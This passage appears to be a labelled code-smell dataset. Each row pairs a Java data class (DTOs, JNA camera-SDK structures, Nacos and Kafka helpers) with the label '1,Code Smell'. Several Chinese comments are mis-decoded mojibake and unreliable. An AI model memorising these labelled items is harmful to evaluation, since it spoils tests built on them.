  }
  /** 
 * set cacheClusterSet
 * @param cacheClusterSet the cacheClusterSet to set
 */
  public void setCacheClusterSet(  CacheClusterSetObject cacheClusterSet){
    this.cacheClusterSet=cacheClusterSet;
  }
}
",1,Code Smell
"public static class NET_DVR_CRUISE_POINT extends Structure {
  public byte PresetNum;
  public byte Dwell;
  public byte Speed;
  public byte Reserve;
}
",1,Code Smell
"/** 
 * @author xiongxy
 * @email 1179705413@qq.com
 * @date 2019-11-22 18:03:46
 */
public class GenColumnsDO implements Serializable {
  private static final long serialVersionUID=1L;
  @JsonSerialize(using=LongToStringSerializer.class) private Long id;
  private String tableName;
  private String columnName;
  private String columnType;
  private String javaType;
  private String columnComment;
  private Integer columnSort;
  private String columnLabel;
  private Integer pageType;
  private Integer isRequired;
  private String dictType;
  private String attrName;
  private String attrname;
  private String extra;
  public String getExtra(){
    return extra;
  }
  public void setExtra(  String extra){
    this.extra=extra;
  }
  public Long getId(){
    return id;
  }
  public void setId(  Long id){
    this.id=id;
  }
  public String getTableName(){
    return tableName;
  }
  public void setTableName(  String tableName){
    this.tableName=tableName;
  }
  public String getColumnName(){
    return columnName;
  }
  public void setColumnName(  String columnName){
    this.columnName=columnName;
  }
  public String getColumnType(){
    return columnType;
  }
  public void setColumnType(  String columnType){
    this.columnType=columnType;
  }
  public String getJavaType(){
    return javaType;
  }
  public void setJavaType(  String javaType){
    this.javaType=javaType;
  }
  public String getColumnComment(){
    return columnComment;
  }
  public void setColumnComment(  String columnComment){
    this.columnComment=columnComment;
  }
  public Integer getColumnSort(){
    return columnSort;
  }
  public void setColumnSort(  Integer columnSort){
    this.columnSort=columnSort;
  }
  public String getColumnLabel(){
    return columnLabel;
  }
  public void setColumnLabel(  String columnLabel){
    this.columnLabel=columnLabel;
  }
  public Integer getPageType(){
    return pageType;
  }
  public void setPageType(  Integer pageType){
    this.pageType=pageType;
  }
  public Integer getIsRequired(){
    return isRequired;
  }
  public void setIsRequired(  Integer isRequired){
    this.isRequired=isRequired;
  }
  public String getDictType(){
    return dictType;
  }
  public void setDictType(  String dictType){
    this.dictType=dictType;
  }
  public String getAttrName(){
    return attrName;
  }
  public void setAttrName(  String attrName){
    this.attrName=attrName;
  }
  public String getAttrname(){
    return attrname;
  }
  public void setAttrname(  String attrname){
    this.attrname=attrname;
  }
}",1,Code Smell
"/** 
 * AgentMetricItem, like PluginMetric
 */
@MetricDomain(name=""Agent"") public class AgentMetricItem extends MetricItem {
  @Dimension public String module;
  @Dimension public String aspect;
  @Dimension public String tag;
  @CountMetric public AtomicLong readNum=new AtomicLong(0);
  @CountMetric public AtomicLong sendNum=new AtomicLong(0);
  @CountMetric public AtomicLong sendFailedNum=new AtomicLong(0);
  @CountMetric public AtomicLong readFailedNum=new AtomicLong(0);
  @CountMetric public AtomicLong readSuccessNum=new AtomicLong(0);
  @CountMetric public AtomicLong sendSuccessNum=new AtomicLong(0);
  @GaugeMetric public AtomicLong runningTasks=new AtomicLong(0);
}",1,Code Smell
"public class WorkflowTestRequest extends StartWorkflowRequest {
  private Map<String,List<TaskMock>> taskRefToMockOutput=new HashMap<>();
  private Map<String,WorkflowTestRequest> subWorkflowTestRequest=new HashMap<>();
public static class TaskMock {
    private TaskResult.Status status=TaskResult.Status.COMPLETED;
    private Map<String,Object> output;
    private long executionTime;
    private long queueWaitTime;
    public TaskMock(){
    }
    public TaskMock(    TaskResult.Status status,    Map<String,Object> output){
      this.status=status;
      this.output=output;
    }
    public TaskResult.Status getStatus(){
      return status;
    }
    public void setStatus(    TaskResult.Status status){
      this.status=status;
    }
    public Map<String,Object> getOutput(){
      return output;
    }
    public void setOutput(    Map<String,Object> output){
      this.output=output;
    }
    public long getExecutionTime(){
      return executionTime;
    }
    public void setExecutionTime(    long executionTime){
      this.executionTime=executionTime;
    }
    public long getQueueWaitTime(){
      return queueWaitTime;
    }
    public void setQueueWaitTime(    long queueWaitTime){
      this.queueWaitTime=queueWaitTime;
    }
  }
  public Map<String,List<TaskMock>> getTaskRefToMockOutput(){
    return taskRefToMockOutput;
  }
  public void setTaskRefToMockOutput(  Map<String,List<TaskMock>> taskRefToMockOutput){
    this.taskRefToMockOutput=taskRefToMockOutput;
  }
  public Map<String,WorkflowTestRequest> getSubWorkflowTestRequest(){
    return subWorkflowTestRequest;
  }
  public void setSubWorkflowTestRequest(  Map<String,WorkflowTestRequest> subWorkflowTestRequest){
    this.subWorkflowTestRequest=subWorkflowTestRequest;
  }
}
",1,Code Smell
"/** 
 * @Auther : dazhi
 * @Date : 2021/9/9 5:40 涓嬪崍
 * @Email :dazhi@dtstack.com
 * @Description :
 */
public class ScheduleFillDataInfoVO {
  /** 
 * 琛ユ暟鎹被鍨嬶細 0 鎵归噺琛ユ暟鎹 1 宸ョ▼琛ユ暟鎹 濡傛灉 fillDataType = 0鏃讹紝taskIds瀛楁鏈夋晥銆 蹇呭～
 */
  @NotNull(message=""fillDataType is not null"") @Min(value=0,message="" Supplement data type: 0 Develop supplement data 1 Project supplement data"") @Max(value=1,message="" Supplement data type: 0 Develop supplement data 1 Project supplement data"") @ApiModelProperty(value=""琛ユ暟鎹被鍨嬶細 0 鎵归噺琛ユ暟鎹甪illDataType = 0鏃讹紝taskIds瀛楁鏈夋晥"",required=true) private Integer fillDataType;
  /** 
 * 鎵归噺琛ユ暟鎹换鍔″垪琛
 */
  @ApiModelProperty(value=""鎵归噺琛ユ暟鎹换鍔″垪琛:fillDataType = 0 涓 rootTaskId == null鐨勬椂鍊欙紝鏈夋晥"") private List<FillDataChooseTaskVO> taskIds;
  /** 
 * 澶磋妭鐐
 */
  @ApiModelProperty(value=""鎵归噺琛ユ暟鎹换鍔″垪琛:fillDataType = 0鏈夋晥,rootTaskId浼樺厛绾уぇ浜巘askIds"") private FillDataChooseTaskVO rootTaskId;
  public Integer getFillDataType(){
    return fillDataType;
  }
  public void setFillDataType(  Integer fillDataType){
    this.fillDataType=fillDataType;
  }
  public List<FillDataChooseTaskVO> getTaskIds(){
    return taskIds;
  }
  public void setTaskIds(  List<FillDataChooseTaskVO> taskIds){
    this.taskIds=taskIds;
  }
  public FillDataChooseTaskVO getRootTaskId(){
    return rootTaskId;
  }
  public void setRootTaskId(  FillDataChooseTaskVO rootTaskId){
    this.rootTaskId=rootTaskId;
  }
}",1,Code Smell
"public static class ClientInfo extends MessageMicro<ClientInfo> {
  public final PBUInt32Field platform=PBField.initUInt32(0);
  public final PBStringField sdk_version=PBField.initString("""");
  public final PBStringField android_package_name=PBField.initString("""");
  public final PBStringField android_signature=PBField.initString("""");
  public final PBStringField ios_bundle_id=PBField.initString("""");
  public final PBStringField pc_sign=PBField.initString("""");
}",1,Code Smell
"public static class ProtoResp {
  public int freeRunnalbleIndex;
  public ProtoReq req;
  public FromServiceMsg resp;
  public ProtoReqRunnable[] runs;
  public long startTime;
  public StatictisInfo statisInfo=new StatictisInfo();
  boolean processed=false;
}
",1,Code Smell
"public static class ALARM_QR_CODE_CHECK_INFO extends SdkStructure {
  public int nEventID;
  public NET_TIME_EX UTC;
  public double dbPTS;
  public byte[] szQRCode=new byte[256];
  public byte[] byReserved=new byte[1024];
}",1,Code Smell
"public static class DEV_DECODER_INFO extends SdkStructure {
  public byte[] szDecType=new byte[64];
  public int nMonitorNum;
  public int nEncoderNum;
  public byte[] szSplitMode=new byte[16];
  public byte[] bMonitorEnable=new byte[16];
  public byte bTVTipDisplay;
  public byte[] reserved1=new byte[3];
  public byte[] byLayoutEnable=new byte[48];
  public int[] dwLayoutEnMask=new int[2];
  public byte[] reserved=new byte[4];
}",1,Code Smell
"public static class NET_DVR_PICCFG extends Structure {
  public int dwSize;
  public byte[] sChanName=new byte[NAME_LEN];
  public int dwVideoFormat;
  public byte byBrightness;
  public byte byContrast;
  public byte bySaturation;
  public byte byHue;
  public int dwShowChanName;
  public short wShowNameTopLeftX;
  public short wShowNameTopLeftY;
  public NET_DVR_VILOST struVILost;
  public NET_DVR_MOTION struMotion;
  public NET_DVR_HIDEALARM struHideAlarm;
  public int dwEnableHide;
  public short wHideAreaTopLeftX;
  public short wHideAreaTopLeftY;
  public short wHideAreaWidth;
  public short wHideAreaHeight;
  public int dwShowOsd;
  public short wOSDTopLeftX;
  public short wOSDTopLeftY;
  public byte byOSDType;
  byte byDispWeek;
  byte byOSDAttrib;
  public byte reservedData2;
}",1,Code Smell
"public static class PushHttpMessage {
  private LinkedMultiValueMap<String,String> message;
  private String url;
  public LinkedMultiValueMap<String,String> getMessage(){
    return message;
  }
  public void setMessage(  LinkedMultiValueMap<String,String> message){
    this.message=message;
  }
  public String getUrl(){
    return url;
  }
  public void setUrl(  String url){
    this.url=url;
  }
}
",1,Code Smell
"public class JoinRelation extends Relation {
  private final JoinOperator joinOp;
  private Relation left;
  private Relation right;
  private Expr onPredicate;
  private String joinHint="""";
  private Expr skewColumn;
  private List<Expr> skewValues;
  private boolean lateral;
  private boolean isImplicit;
  /** 
 * usingColNames is created by parser and will be converted to onPredicate in Analyzer
 */
  private List<String> usingColNames;
  public JoinRelation(  JoinOperator joinOp,  Relation left,  Relation right,  Expr onPredicate,  boolean isLateral){
    this(joinOp,left,right,onPredicate,isLateral,NodePosition.ZERO);
  }
  public JoinRelation(  JoinOperator joinOp,  Relation left,  Relation right,  Expr onPredicate,  boolean isLateral,  NodePosition pos){
    super(pos);
    if (joinOp == null) {
      this.joinOp=JoinOperator.CROSS_JOIN;
      isImplicit=true;
    }
 else {
      this.joinOp=joinOp;
    }
    this.left=left;
    this.right=right;
    this.onPredicate=onPredicate;
    this.lateral=isLateral;
  }
  public JoinOperator getJoinOp(){
    return joinOp;
  }
  public Relation getLeft(){
    return left;
  }
  public Relation getRight(){
    return right;
  }
  public void setLeft(  Relation left){
    this.left=left;
  }
  public void setRight(  Relation right){
    this.right=right;
  }
  public Expr getOnPredicate(){
    return onPredicate;
  }
  public void setOnPredicate(  Expr onPredicate){
    this.onPredicate=onPredicate;
  }
  public void setJoinHint(  String joinHint){
    this.joinHint=StringUtils.upperCase(joinHint);
  }
  public String getJoinHint(){
    return joinHint;
  }
  public void setSkewColumn(  Expr column){
    this.skewColumn=column;
  }
  public Expr getSkewColumn(){
    return skewColumn;
  }
  public void setSkewValues(  List<Expr> values){
    this.skewValues=values;
  }
  public List<Expr> getSkewValues(){
    return skewValues;
  }
  public boolean isLateral(){
    return lateral;
  }
  public void setLateral(  boolean lateral){
    this.lateral=lateral;
  }
  public boolean isImplicit(){
    return isImplicit;
  }
  public List<String> getUsingColNames(){
    return usingColNames;
  }
  public void setUsingColNames(  List<String> usingColNames){
    this.usingColNames=usingColNames;
  }
  @Override public <R,C>R accept(  AstVisitor<R,C> visitor,  C context){
    return visitor.visitJoin(this,context);
  }
}
",1,Code Smell
"public static class WDDM13 extends WDDM12 {
  public static final int KMTQAITYPE_MULTIPLANEOVERLAY_SUPPORT=20;
  public static final int KMTQAITYPE_DLIST_DRIVER_NAME=21;
  public static final int KMTQAITYPE_WDDM_1_3_CAPS=22;
  public static final int KMTQAITYPE_MULTIPLANEOVERLAY_HUD_SUPPORT=23;
}",1,Code Smell
"public static class NET_RESOURCE_STATE extends SdkStructure {
  public int nIPChanneIn;
  public int nNetRemain;
  public int nNetCapability;
  public int nRemotePreview;
  public int nRmtPlayDownload;
  public int nRemoteSendRemain;
  public int nRemoteSendCapability;
  public byte[] byReserved=new byte[32];
}",1,Code Smell
"/** 
 * @author satorux@google.com (Satoru Takabayashi) - creator
 * @author dswitkin@google.com (Daniel Switkin) - ported from C++
 */
public final class QRCode {
  public static final int NUM_MASK_PATTERNS=8;
  private Mode mode;
  private ErrorCorrectionLevel ecLevel;
  private Version version;
  private int maskPattern;
  private ByteMatrix matrix;
  public QRCode(){
    maskPattern=-1;
  }
  public Mode getMode(){
    return mode;
  }
  public ErrorCorrectionLevel getECLevel(){
    return ecLevel;
  }
  public Version getVersion(){
    return version;
  }
  public int getMaskPattern(){
    return maskPattern;
  }
  public ByteMatrix getMatrix(){
    return matrix;
  }
  @Override public String toString(){
    StringBuilder result=new StringBuilder(200);
    result.append(""<<\n"");
    result.append("" mode: "");
    result.append(mode);
    result.append(""\n ecLevel: "");
    result.append(ecLevel);
    result.append(""\n version: "");
    result.append(version);
    result.append(""\n maskPattern: "");
    result.append(maskPattern);
    if (matrix == null) {
      result.append(""\n matrix: null\n"");
    }
 else {
      result.append(""\n matrix:\n"");
      result.append(matrix);
    }
    result.append("">>\n"");
    return result.toString();
  }
  public void setMode(  Mode value){
    mode=value;
  }
  public void setECLevel(  ErrorCorrectionLevel value){
    ecLevel=value;
  }
  public void setVersion(  Version version){
    this.version=version;
  }
  public void setMaskPattern(  int value){
    maskPattern=value;
  }
  public void setMatrix(  ByteMatrix value){
    matrix=value;
  }
  public static boolean isValidMaskPattern(  int maskPattern){
    return maskPattern >= 0 && maskPattern < NUM_MASK_PATTERNS;
  }
}",1,Code Smell
"public class RoleMenuDO {
  private Long id;
  private Long roleId;
  private Long menuId;
  public Long getId(){
    return id;
  }
  public void setId(  Long id){
    this.id=id;
  }
  public Long getRoleId(){
    return roleId;
  }
  public void setRoleId(  Long roleId){
    this.roleId=roleId;
  }
  public Long getMenuId(){
    return menuId;
  }
  public void setMenuId(  Long menuId){
    this.menuId=menuId;
  }
  @Override public String toString(){
    return ""RoleMenuDO{"" + ""id="" + id + "", roleId=""+ roleId+ "", menuId=""+ menuId+ '}';
  }
}
",1,Code Smell
"static class Product {
  public String name;
  public Timestamp ts;
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public Timestamp getTs(){
    return ts;
  }
  public void setTs(  Timestamp ts){
    this.ts=ts;
  }
}
",1,Code Smell
"@SuppressWarnings(""unused"") @YamlPropertyOrder({""type"",""negative"",""part"",""condition"",""words""}) public class Word implements TemplateMatcher {
  @YamlProperty private final String type=Word.class.getSimpleName().toLowerCase();
  @YamlProperty private Boolean negative;
  @YamlProperty private Part part=Part.all;
  @YamlProperty private List<String> words;
  @YamlProperty private Condition condition;
  public Word(){
  }
  public Word(  String... words){
    this.words=Arrays.asList(words);
  }
  public List<String> getWords(){
    return this.words;
  }
  @Override public String getType(){
    return this.type;
  }
  @Override public Part getPart(){
    return this.part;
  }
  @Override public void setPart(  Part part){
    this.part=part;
  }
  @Override public Condition getCondition(){
    return Optional.ofNullable(this.condition).orElse(Condition.or);
  }
  @Override public void setCondition(  Condition condition){
    this.condition=condition;
  }
  public Boolean getNegative(){
    return negative;
  }
  public void setNegative(  Boolean negative){
    this.negative=negative;
  }
}
",1,Code Smell
"public static class NET_DVR_TIME_SEARCH extends Structure {
  public short wYear;
  public byte byMonth;
  public byte byDay;
  public byte byHour;
  public byte byMinute;
  public byte bySecond;
  public byte cTimeDifferenceH;
  public byte cTimeDifferenceM;
  public byte byLocalOrUTC;
  public short wMillisecond;
}
",1,Code Smell
"/** 
 * JDBC中定义的常量
 */
public class JDBCConsts {
  /** 
 * select 
 */
  public static final String KEY_SELECT=""select"";
  /** 
 * with 
 */
  public static final String KEY_WITH=""with"";
  /** 
 * call 
 */
  public static final String KEY_CALL=""call"";
  /** 
 * calls 
 */
  public static final String KEY_CALLS=""calls"";
  /** 
 * set 
 */
  public static final String KEY_SET=""set"";
  /** 
 * sqlfirst 
 */
  public static final String KEY_SQLFIRST=""sqlfirst"";
  /** 
 * simple 
 */
  public static final String KEY_SIMPLE=""simple"";
  /** 
 * unknown 
 */
  public static final byte TYPE_NONE=0;
  /** 
 * Execute statement 
 */
  public static final byte TYPE_EXE=1;
  /** 
 * Expression statement 
 */
  public static final byte TYPE_EXP=2;
  /** 
 * Call statement 
 */
  public static final byte TYPE_CALL=3;
  /** 
 * Call statements 
 */
  public static final byte TYPE_CALLS=4;
  /** 
 * Execute spl statement 
 */
  public static final byte TYPE_SPL=5;
  /** 
 * Execute SQL statement 
 */
  public static final byte TYPE_SQL=6;
  /** 
 * Execute simple SQL statement 
 */
  public static final byte TYPE_SIMPLE_SQL=7;
  /** 
 * Field names in the result set
 */
  public static final String TABLE_CAT=""TABLE_CAT"";
  public static final String TABLE_SCHEM=""TABLE_SCHEM"";
  public static final String TABLE_NAME=""TABLE_NAME"";
  public static final String COLUMN_NAME=""COLUMN_NAME"";
  public static final String DATA_TYPE=""DATA_TYPE"";
  public static final String PROCEDURE_NAME=""PROCEDURE_NAME"";
  public static final String PROCEDURE_FILE=""PROCEDURE_FILE"";
  public static final String PARAM_LIST=""PARAM_LIST"";
  public static final String PKTABLE_CAT=""PKTABLE_CAT"";
  public static final String PKTABLE_SCHEM=""PKTABLE_SCHEM"";
  public static final String PKTABLE_NAME=""PKTABLE_NAME"";
  public static final String PKCOLUMN_NAME=""PKCOLUMN_NAME"";
  public static final String FKTABLE_CAT=""FKTABLE_CAT"";
  public static final String FKTABLE_SCHEM=""FKTABLE_SCHEM"";
  public static final String FKTABLE_NAME=""FKTABLE_NAME"";
  public static final String FKCOLUMN_NAME=""FKCOLUMN_NAME"";
  public static final String FK_NAME=""FK_NAME"";
  public static final String PK_NAME=""PK_NAME"";
  public static final String KEY_SEQ=""KEY_SEQ"";
  /** 
 * JDBC支持的数据文件类型 
 */
  public static final String DATA_FILE_EXTS=AppConsts.FILE_BTX + "","" + AppConsts.FILE_CTX+ "",""+ AppConsts.FILE_TXT+ "",""+ AppConsts.FILE_CSV+ "",""+ AppConsts.FILE_XLS+ "",""+ AppConsts.FILE_XLSX;
  /** 
 * 缺省一次获取的行数
 */
  public static final int DEFAULT_FETCH_SIZE=1024 * 100;
  /** 
 * Default data type
 */
  public static final int DEFAULT_TYPE=java.sql.Types.NULL;
  /** 
 * 缺省的连接超时时长，单位秒
 */
  public static final int DEFAULT_CONNECT_TIMEOUT=5;
}",1,Code Smell
"/** 
 * 搴撳瓨淇℃伅DTO
 * @author FrozenWatermelon
 * @date 2020-10-28 15:27:24
 */
public class SkuStockDTO {
  private static final long serialVersionUID=1L;
  @Schema(description=""搴撳瓨id"") private Long stockId;
  @Schema(description=""SKU ID"") private Long skuId;
  @Schema(description=""搴撳瓨"") private Integer stock;
  public Long getStockId(){
    return stockId;
  }
  public void setStockId(  Long stockId){
    this.stockId=stockId;
  }
  public Long getSkuId(){
    return skuId;
  }
  public void setSkuId(  Long skuId){
    this.skuId=skuId;
  }
  public Integer getStock(){
    return stock;
  }
  public void setStock(  Integer stock){
    this.stock=stock;
  }
  @Override public String toString(){
    return ""StockDTO{"" + ""stockId="" + stockId + "",skuId=""+ skuId+ "",stock=""+ stock+ '}';
  }
}",1,Code Smell
"public class FunctionReturn {
  public boolean booleanReturn;
  public byte byteReturn;
  public short shortReturn;
  public int intReturn;
  public long longReturn;
  public float floatReturn;
  public double doubleReturn;
  public Object objectReturn;
}
",1,Code Smell
"/** 
 * rest result class
 * @param < T > data type
 * @author Nacos
 */
public class RestResult<T> implements Serializable {
  /** 
 */
  private static final long serialVersionUID=6095433538316185017L;
  private int code;
  private String message;
  private T data;
  public RestResult(){
  }
  public RestResult(  int code,  String message,  T data){
    this.code=code;
    this.setMessage(message);
    this.data=data;
  }
  public RestResult(  int code,  T data){
    this.code=code;
    this.data=data;
  }
  public RestResult(  int code,  String message){
    this.code=code;
    this.setMessage(message);
  }
  public int getCode(){
    return code;
  }
  public void setCode(  int code){
    this.code=code;
  }
  public String getMessage(){
    return message;
  }
  public void setMessage(  String message){
    this.message=message;
  }
  public T getData(){
    return data;
  }
  public void setData(  T data){
    this.data=data;
  }
}",1,Code Smell
"public static class NET_IN_SPLIT_OPEN_WINDOW extends SdkStructure {
  public int dwSize;
  public int nChannel;
  public DH_RECT stuRect;
  public int bDirectable;
  public NET_IN_SPLIT_OPEN_WINDOW(){
    this.dwSize=this.size();
  }
}
",1,Code Smell
"public static class TestData {
  public String name;
  public LocalDateTime localDateTime;
  public Date date;
  public LocalDateTime nullLocalDateTime;
  public Date nullDate;
}
",1,Code Smell
"public static class EM_FACE_DB_TYPE extends SdkStructure {
  public static final int NET_FACE_DB_TYPE_UNKOWN=0;
  public static final int NET_FACE_DB_TYPE_HISTORY=1;
  public static final int NET_FACE_DB_TYPE_BLACKLIST=2;
  public static final int NET_FACE_DB_TYPE_WHITELIST=3;
  public static final int NET_FACE_DB_TYPE_ALARM=4;
  public static final int NET_FACE_DB_TYPE_PASSERBY=5;
}",1,Code Smell
"/** 
 * @author 119178
 * @description 鍏畨瑙嗛鍥惧儚淇℃伅搴旂敤绯荤粺鎺ュ叆閰嶇疆(瀵瑰簲鏋氫妇鍊� {@link NET_EM_CFG_OPERATE_TYPE})
 * @date 2020/6/9
 */
public class NET_CFG_VSP_GAVI_INFO extends SdkStructure {
  /** 
 * 缁撴瀯浣撳ぇ灏�
 */
  public int dwSize;
  /** 
 * 娉ㄥ唽骞冲彴涓暟
 */
  public int nGaviInfoCount;
  /** 
 * 娉ㄥ唽骞冲彴淇℃伅
 */
  public NET_VSP_GAVI_INFO[] stuGaviInfo=(NET_VSP_GAVI_INFO[])new NET_VSP_GAVI_INFO().toArray(16);
  /** 
 * stuPlatformInfo涓暟
 */
  public int nPlatformCount;
  /** 
 * 鎺ュ叆骞冲彴鑼冨洿淇℃伅锛屼笉鍏佽淇敼
 */
  public NET_VSP_GAVI_PLATFORM_INFO[] stuPlatformInfo=(NET_VSP_GAVI_PLATFORM_INFO[])new NET_VSP_GAVI_PLATFORM_INFO().toArray(64);
  public NET_CFG_VSP_GAVI_INFO(){
    this.dwSize=this.size();
  }
}",1,Code Smell
"/** 
 * cache item
 * @author Nacos
 */
public class CacheItem {
  public CacheItem(  String groupKey){
    this.groupKey=DataIdGroupIdCache.getSingleton(groupKey);
  }
  public String getMd5(){
    return md5;
  }
  public void setMd5(  String md5){
    this.md5=md5;
  }
  public long getLastModifiedTs(){
    return lastModifiedTs;
  }
  public void setLastModifiedTs(  long lastModifiedTs){
    this.lastModifiedTs=lastModifiedTs;
  }
  public boolean isBeta(){
    return isBeta;
  }
  public void setBeta(  boolean isBeta){
    this.isBeta=isBeta;
  }
  public String getMd54Beta(){
    return md54Beta;
  }
  public void setMd54Beta(  String md54Beta){
    this.md54Beta=md54Beta;
  }
  public List<String> getIps4Beta(){
    return ips4Beta;
  }
  public void setIps4Beta(  List<String> ips4Beta){
    this.ips4Beta=ips4Beta;
  }
  public long getLastModifiedTs4Beta(){
    return lastModifiedTs4Beta;
  }
  public void setLastModifiedTs4Beta(  long lastModifiedTs4Beta){
    this.lastModifiedTs4Beta=lastModifiedTs4Beta;
  }
  public SimpleReadWriteLock getRwLock(){
    return rwLock;
  }
  public void setRwLock(  SimpleReadWriteLock rwLock){
    this.rwLock=rwLock;
  }
  public String getGroupKey(){
    return groupKey;
  }
  public Map<String,String> getTagMd5(){
    return tagMd5;
  }
  public Map<String,Long> getTagLastModifiedTs(){
    return tagLastModifiedTs;
  }
  public void setTagMd5(  Map<String,String> tagMd5){
    this.tagMd5=tagMd5;
  }
  public void setTagLastModifiedTs(  Map<String,Long> tagLastModifiedTs){
    this.tagLastModifiedTs=tagLastModifiedTs;
  }
  final String groupKey;
  public volatile String md5=Constants.NULL;
  public volatile long lastModifiedTs;
  /** 
 * use for beta
 */
  public volatile boolean isBeta=false;
  public volatile String md54Beta=Constants.NULL;
  public volatile List<String> ips4Beta;
  public volatile long lastModifiedTs4Beta;
  public volatile Map<String,String> tagMd5;
  public volatile Map<String,Long> tagLastModifiedTs;
  public SimpleReadWriteLock rwLock=new SimpleReadWriteLock();
}",1,Code Smell
"/** 
 * @author zengqiao
 * @date 20/5/20
 */
public class KafkaConstant {
  public static final List<String> KAFKA_INTERNAL_TOPICS=Arrays.asList(Topic.TRANSACTION_STATE_TOPIC_NAME,Topic.GROUP_METADATA_TOPIC_NAME,""__cluster_metadata"");
  public static final String VERSION=""version"";
  public static final String PARTITIONS=""partitions"";
  public static final String EXTERNAL_KEY=""EXTERNAL"";
  public static final String INTERNAL_KEY=""INTERNAL"";
  public static final String WITHOUT_RACK_INFO_NAME="""";
  public static final Integer DATA_VERSION_ONE=1;
  public static final Integer ADMIN_CLIENT_REQUEST_TIME_OUT_UNIT_MS=10000;
  public static final Integer KAFKA_SASL_SCRAM_ITERATIONS=8192;
  public static final Integer NO_LEADER=-1;
  public static final Long POLL_ONCE_TIMEOUT_UNIT_MS=2000L;
  public static final String CONTROLLER_ROLE=""controller"";
  public static final String DEFAULT_CONNECT_VERSION=""2.5.0"";
  public static final List<String> CONFIG_SIMILAR_IGNORED_CONFIG_KEY_LIST=Arrays.asList(""broker.id"",""listeners"",""name"",""value"",""advertised.listeners"",""node.id"");
  public static final Map<String,ConfigDef.ConfigKey> KAFKA_ALL_CONFIG_DEF_MAP=new ConcurrentHashMap<>();
  public static final Integer TOPICK_TRUNCATE_DEFAULT_OFFSET=-1;
static {
    try {
      KAFKA_ALL_CONFIG_DEF_MAP.putAll(CollectionConverters.asJava(LogConfig$.MODULE$.configKeys()));
    }
 catch (    Exception e) {
    }
    try {
      KAFKA_ALL_CONFIG_DEF_MAP.putAll(CollectionConverters.asJava(KafkaConfig$.MODULE$.configKeys()));
    }
 catch (    Exception e) {
    }
  }
  private KafkaConstant(){
  }
}",1,Code Smell
"@Getter @Setter public class Ride {
  private User driver;
  private String source;
  private String destination;
  private List<User> customers;
  private Date startTime;
  private Date endTime;
  private Vehicle vehicle;
  private int seats;
  public Ride(  User driver,  String src,  String dest,  int seats,  Vehicle vehicle,  String vehicleNumber){
    this.driver=driver;
    this.source=src;
    this.destination=dest;
    this.seats=seats;
    this.vehicle=vehicle;
  }
  public void addCustomer(  User customer) throws SeatNotVacantException {
    if (seats == 0)     throw new SeatNotVacantException(""Seat not vacant in vehicle: "" + vehicle);
    customers.add(customer);
    seats--;
  }
  @Override public boolean equals(  Object o){
    if (this == o)     return true;
    if (o == null || getClass() != o.getClass())     return false;
    Ride ride=(Ride)o;
    return getSeats() == ride.getSeats() && Objects.equals(getDriver(),ride.getDriver()) && Objects.equals(getSource(),ride.getSource()) && Objects.equals(getDestination(),ride.getDestination()) && Objects.equals(getCustomers(),ride.getCustomers()) && Objects.equals(getStartTime(),ride.getStartTime()) && Objects.equals(getEndTime(),ride.getEndTime()) && Objects.equals(getVehicle(),ride.getVehicle());
  }
  @Override public int hashCode(){
    return Objects.hash(getDriver(),getSource(),getDestination(),getCustomers(),getStartTime(),getEndTime(),getVehicle(),getSeats());
  }
}
public class ride {
  private user rideGiver;
  private vehicle giverVehicle;
  private int available_seats;
  private String origin;
  private String destination;
  private Date startTime;
  private int ride_duration;
  public ride(  user u,  vehicle v,  int seats,  String origin,  String destination,  Date startTime,  int duration){
    this.rideGiver=u;
    this.giverVehicle=v;
    this.available_seats=seats;
    this.origin=origin;
    this.destination=destination;
    this.startTime=startTime;
    this.ride_duration=duration;
  }
  public String getOrigin(){
    return origin;
  }
  public String getDestination(){
    return destination;
  }
  public vehicle getGiverVehicle(){
    return giverVehicle;
  }
  public int getRide_duration(){
    return ride_duration;
  }
  public Date getStartTime(){
    return startTime;
  }
  public int getAvailable_seats(){
    return available_seats;
  }
  public user getRideUser(){
    return this.rideGiver;
  }
  public void setAvailable_seats(  int available_seats){
    this.available_seats=available_seats;
  }
}",1,Code Smell
"/** 
 * @description :
 * @author : zjj
 * @date : 2021-05-18 10:53
 */
@Configuration @ConfigurationProperties(prefix=""rocketmq"") public class MqConfig {
  private String accessKey;
  private String secretKey;
  private String nameSrvAddr;
  private String topicOne;
  private String topicTwo;
  private String groupId;
  public Properties getProperties(){
    Properties properties=new Properties();
    properties.setProperty(PropertyKeyConst.AccessKey,this.accessKey);
    properties.setProperty(PropertyKeyConst.SecretKey,this.secretKey);
    properties.setProperty(PropertyKeyConst.NAMESRV_ADDR,this.nameSrvAddr);
    properties.setProperty(PropertyKeyConst.GROUP_ID,this.groupId);
    properties.setProperty(PropertyKeyConst.SendMsgTimeoutMillis,""4000"");
    return properties;
  }
  public String getAccessKey(){
    return accessKey;
  }
  public void setAccessKey(  String accessKey){
    this.accessKey=accessKey;
  }
  public String getSecretKey(){
    return secretKey;
  }
  public void setSecretKey(  String secretKey){
    this.secretKey=secretKey;
  }
  public String getNameSrvAddr(){
    return nameSrvAddr;
  }
  public void setNameSrvAddr(  String nameSrvAddr){
    this.nameSrvAddr=nameSrvAddr;
  }
  public String getTopicOne(){
    return topicOne;
  }
  public void setTopicOne(  String topicOne){
    this.topicOne=topicOne;
  }
  public String getTopicTwo(){
    return topicTwo;
  }
  public void setTopicTwo(  String topicTwo){
    this.topicTwo=topicTwo;
  }
  public String getGroupId(){
    return groupId;
  }
  public void setGroupId(  String groupId){
    this.groupId=groupId;
  }
}",1,Code Smell
"@Getter @Setter public class OrganizationMemberDTO {
  private String id;
  private String name;
  private String email;
  private String phone;
  private String status;
  private Long createTime;
  private Long updateTime;
  private String language;
  private String organizationId;
  private List<String> roleIds=new ArrayList<>();
  public String getId(){
    return id;
  }
  public void setId(  String id){
    this.id=id;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public String getEmail(){
    return email;
  }
  public void setEmail(  String email){
    this.email=email;
  }
  public String getPhone(){
    return phone;
  }
  public void setPhone(  String phone){
    this.phone=phone;
  }
  public String getStatus(){
    return status;
  }
  public void setStatus(  String status){
    this.status=status;
  }
  public Long getCreateTime(){
    return createTime;
  }
  public void setCreateTime(  Long createTime){
    this.createTime=createTime;
  }
  public Long getUpdateTime(){
    return updateTime;
  }
  public void setUpdateTime(  Long updateTime){
    this.updateTime=updateTime;
  }
  public String getLanguage(){
    return language;
  }
  public void setLanguage(  String language){
    this.language=language;
  }
  public String getOrganizationId(){
    return organizationId;
  }
  public void setOrganizationId(  String organizationId){
    this.organizationId=organizationId;
  }
  public List<String> getRoleIds(){
    return roleIds;
